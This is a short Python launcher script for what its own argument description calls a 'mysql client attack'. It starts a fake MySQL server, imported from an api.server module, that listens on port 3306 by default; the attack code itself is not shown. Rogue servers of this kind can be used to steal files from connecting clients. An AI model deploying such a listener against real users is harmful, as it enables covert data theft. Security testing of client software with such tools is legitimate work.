from api.server import mysql
import argparse

parser = argparse.ArgumentParser(description = "mysql client attack")
parser.add_argument("-l", default="0.0.0.0", type=str, dest="addr", help="Specify ip for listen ")
parser.add_argument("-p", default=3306, type=int, dest="port", help="Specify local port for listen")
parser.add_argument("-c", default=1, type=int)

args = parser.parse_args()

ser = mysql(args.addr, args.port)
ser.start()